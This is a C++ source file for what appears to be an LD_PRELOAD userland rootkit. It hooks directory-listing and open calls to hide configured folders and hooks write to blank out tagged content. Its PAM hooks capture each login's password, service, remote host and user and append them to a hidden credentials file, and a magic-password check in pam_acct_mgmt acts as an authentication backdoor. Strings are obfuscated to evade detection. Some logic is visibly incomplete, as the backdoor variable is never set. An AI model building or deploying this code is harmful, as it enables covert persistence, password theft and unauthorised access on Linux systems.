// libjakshoo.cpp

#define _GNU_SOURCE  
#include <dlfcn.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>
#include <sys/types.h>
#include <string.h>
#include <pwd.h>
#include <unistd.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>  
#include <krb5/krb5.h>
#include <security/pam_modutil.h>
#include <iostream>
#include <security/_pam_macros.h>
#include <security/pam_appl.h>
#include "utils/obfuscate.h"
#include "utils/config.h"
#include <stdint.h>
#include <inttypes.h>
#include <dirent.h>
#include <X11/Xlib.h>
#include <gtk/gtk.h>
#include <X11/Xutil.h>
#include <X11/Xatom.h>
#include <sys/syscall.h>
#include <gio/gio.h>
#include <glib.h>


static int (*original_getaddrinfo)(const char *node, const char *service, const struct addrinfo *hints, struct addrinfo **res);
static struct passwd *(*original_getpwnam)(const char *name);
static int (*original_getpwnam_r)(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result);
static int (*original_pam_get_item)(const pam_handle_t *pamh, int item_type, const void **item);
static krb5_error_code (*original_krb5_get_init_creds_password)(krb5_context context, 
											krb5_creds * creds, 
											krb5_principal client, 
											const char * password, 
											krb5_prompter_fct prompter, 
											void * data, krb5_deltat start_time, 
											const char * in_tkt_service, 
											krb5_get_init_creds_opt * k5_gic_options);
static int (*original_pam_acct_mgmt)(pam_handle_t *pamh, int flags);
static int (*original_pam_set_item)(pam_handle_t* pamh, int item_type, const void *item);
static int (*original_pam_authenticate)(pam_handle_t* pamh, int flags);
static int (*original_pam_get_authtok)(pam_handle_t* pamh, int item, const char **authtok, const char *prompt);
static int (*original_pam_get_user)(const pam_handle_t *pamh, const char **user, const char *prompt);
static ssize_t (*original_write)(int fd, const void *buf, size_t count);
static ssize_t (*original_read)(int fd, void *buf, size_t count);
static size_t (*original_fwrite)(const void *ptr, size_t size, size_t nmemb, FILE *stream);
static ssize_t (*original_getdents64)(int fd, void *dirp, size_t count);

#define PAM_SUCCESS 0
#define PAM_SERVICE 1
#define PAM_AUTHTOK 6
#define PAM_RHOST 4
#define PAM_USER 2

__attribute__((visibility("hidden")))
void get_heap_bounds(uint64_t* heap_start, uint64_t* heap_end){
    FILE *stream;
    char *line = NULL;
    size_t len = 0;
    ssize_t nread;

    stream = fopen(AY_OBFUSCATE("/proc/self/maps"), "r");

    while ((nread = getline(&line, &len, stream)) != -1) {
        if (strstr(line, AY_OBFUSCATE("[heap]"))){
            sscanf(line, "%" SCNx64 "-%" SCNx64 "", heap_start, heap_end);
            break;
        }
    }

    free(line);
    fclose(stream);
}
__attribute__((visibility("hidden")))
bool is_heap_var(void* pointer){
    uint64_t heap_start = 0;
    uint64_t heap_end = 0;
    get_heap_bounds(&heap_start, &heap_end);

    if (pointer >= (void*)heap_start && pointer <= (void*)heap_end){
        return true;
    }
    return false;
}


// hide folders
struct dirent *readdir(DIR *dirp) {
    struct dirent *(*real_readdir)(DIR *);
    real_readdir = dlsym(RTLD_NEXT, AY_OBFUSCATE("readdir"));

    struct dirent *entry;
    while ((entry = real_readdir(dirp)) != NULL) {
        if (strcmp(entry->d_name, (char*)*HIDDEN_FOLDERS) == 0) {
            continue;  
        }
        return entry;  
    }

    return NULL;  
}

int open(const char *pathname, int flags, mode_t mode) {
  // Carrega a função original do open
  int (*original_open)(const char *, int, mode_t) = dlsym(RTLD_NEXT, AY_OBFUSCATE("open"));

  // Se o arquivo a ser aberto for a pasta desejada, retorna um erro
  if (strstr(pathname, (char*)*HIDDEN_FOLDERS) != NULL) {
    return -1;
  }

  // Chama o open original para abrir o arquivo
  return (*original_open)(pathname, flags, mode);
}

DIR *opendir(const char *name) {
  // Carrega a função original do opendir
  DIR *(*original_opendir)(const char *) = dlsym(RTLD_NEXT, AY_OBFUSCATE("opendir"));

  // Se o diretório a ser aberto for a pasta desejada, retorna um erro
  if (strstr(name, (char*)*HIDDEN_FOLDERS) != NULL) {
    return NULL;
  }

  // Chama o opendir original para abrir o diretório
  return (*original_opendir)(name);
}
__attribute__((visibility("hidden")))
int filter(const struct dirent *entry){
    if (strcmp(entry->d_name, AY_OBFUSCATE(".")) == 0 || strcmp(entry->d_name, AY_OBFUSCATE("..")) == 0) {
        return 0;
    }
    if (strstr(entry->d_name, (char*)*HIDDEN_FOLDERS) != NULL) {
        return 0;
    }
    return 1;
}

int scandir(const char *dirp, struct dirent ***namelist, int (*filter)(const struct dirent *),
           int (*compar)(const struct dirent **, const struct dirent **)){
    int count = 0;
    struct dirent **list;
    struct dirent *entry;

    DIR *dir = opendir(dirp);
    if (dir == NULL) {
        return -1;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (filter(entry)) {
            count++;
        }
    }

    rewinddir(dir);
    list = (struct dirent **) malloc(sizeof(struct dirent *) * count);

    int i = 0;
    while ((entry = readdir(dir)) != NULL) {
        if (filter(entry)) {
            list[i] = entry;
            i++;
        }
    }

    qsort(list, count, sizeof(struct dirent *), (int (*)(const void *, const void *)) compar);

    *namelist = list;
    closedir(dir);

    return count;
}


typedef ssize_t (*orig_read)(int fd, void *buf, size_t count);

// file content tampering
ssize_t write(int fd, const void *buf, size_t count){
	char *p1, *p2;
	int i;
	if(original_write == NULL){
		original_write = (ssize_t(*)(int, const void*, size_t))dlsym(RTLD_NEXT, AY_OBFUSCATE("write"));
	}
	p1 = strstr((char*)buf, HIDETAG_ENTRY);
	p2 = strstr((char*)buf, HIDETAG_STOP);
	if(p1 || p2){
		if(!is_heap_var((void*)buf)){

			int start_str = p1 - (char*)buf - 2;
			int final_str = p2 - (char*)buf + strlen(HIDETAG_STOP) + 2;

			for(i = start_str; i < final_str; i++){
				((char*)buf)[i] = '\r';
			}
		}
		else{
			buf = 0;

		}
	};
	ssize_t ret = original_write(fd, buf, count);
	return ret;
}




// PAM hooks

static char* passpam;
static char* wrongpass;
const char ** username;
static void *service = NULL;
static void *rhost = NULL;
static void *user = NULL;
static FILE *fptr;


int pam_get_user(const pam_handle_t *pamh, const char **user, const char *prompt){
	if(original_pam_get_user == NULL){
		original_pam_get_user = (int(*)(pam_handle_t*, const char**, const char*))dlsym(RTLD_NEXT, AY_OBFUSCATE("pam_get_user"));
	}
	int ret = original_pam_get_user(pamh, user, prompt);
	if(ret == PAM_SUCCESS && !strcmp((char*)*user, AY_OBFUSCATE("sshd"))){
		username = user;
	}
	return ret;
}

__attribute__((visibility("hidden")))
int save_creds(){
	fptr = fopen((char*)*CREDENTIALS_FILE,"at");
	char buffer[1024];
	if(!fptr){
		fptr = fopen((char*)*CREDENTIALS_FILE, "wt");
	}
	snprintf(buffer, sizeof(buffer), AY_OBFUSCATE("PAM :: %s - %s - %s - %s\n"), (char*)service, (char*)rhost, (char*)user, passpam);
	fwrite(buffer, sizeof(char), strlen(buffer), fptr);
	fclose(fptr);
	return 0;
}

int pam_get_authtok(pam_handle_t *pamh, int item, const char **authtok, const char* prompt){
	if(original_pam_get_authtok == NULL){
		original_pam_get_authtok = (int(*)(pam_handle_t*, int, const char**, const char*))dlsym(RTLD_NEXT, AY_OBFUSCATE("pam_get_authtok"));
	}
	int ret = original_pam_get_authtok(pamh, item, authtok, prompt);
	if(passpam == NULL){
		passpam = strdup((char*)*authtok);
	}
	return ret;
}

int pam_acct_mgmt(pam_handle_t *pamh, int flags){
	if(original_pam_acct_mgmt == NULL){
		original_pam_acct_mgmt = (int(*)(pam_handle_t*, int))dlsym(RTLD_NEXT, AY_OBFUSCATE("pam_acct_mgmt"));
	}
	int ret = original_pam_acct_mgmt(pamh, flags);
	if (ret == PAM_AUTH_ERR && !strcmp(wrongpass, MAGIC_PASS)) {
		return PAM_SUCCESS;
	}
	return ret;
}

int pam_authenticate(pam_handle_t * pamh, int flags)
{
	char buf[1024];
	int len;

	static int (*orig_pam_authenticate)(pam_handle_t *, int);

	if (!orig_pam_authenticate) {
		orig_pam_authenticate =
		    dlsym(RTLD_NEXT, AY_OBFUSCATE("pam_authenticate"));
	}

	int r = orig_pam_authenticate(pamh, flags);
	int bkp = errno;

	if (r == PAM_SUCCESS) {
		pam_get_item(pamh, PAM_SERVICE, &service);
		pam_get_item(pamh, PAM_RHOST, &rhost);
		pam_get_item(pamh, PAM_USER, &user);
	}
	save_creds();
	passpam = NULL;
	errno = bkp;

	return r;
}

// end PAM hooks

int getaddrinfo(const char *node, const char *service, const struct addrinfo *hints, struct addrinfo **res){
	if(original_getaddrinfo == NULL){
		original_getaddrinfo = (int(*)(const char*, const char*, const struct addrinfo*, struct addrinfo**))dlsym(RTLD_NEXT, AY_OBFUSCATE("getaddrinfo"));
	}
	int ret;
	ret = original_getaddrinfo(node, service, hints, res);
	return ret;
};

struct passwd *getpwnam(const char *name){
	if(original_getpwnam == NULL){
		original_getpwnam = (struct passwd *(*)(const char*))dlsym(RTLD_NEXT, AY_OBFUSCATE("getpwnam"));
	}
	passwd *ret = NULL;
	ret = original_getpwnam(name);
	return ret;
}

int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result){
	if(original_getpwnam_r == NULL){
		original_getpwnam_r = (int(*)(const char*, struct passwd*, char *, size_t, struct passwd **))dlsym(RTLD_NEXT, AY_OBFUSCATE("getpwnam_r"));
	}
	int ret;
	ret = original_getpwnam_r(name, pwd, buf, buflen, result);
	return ret;
}

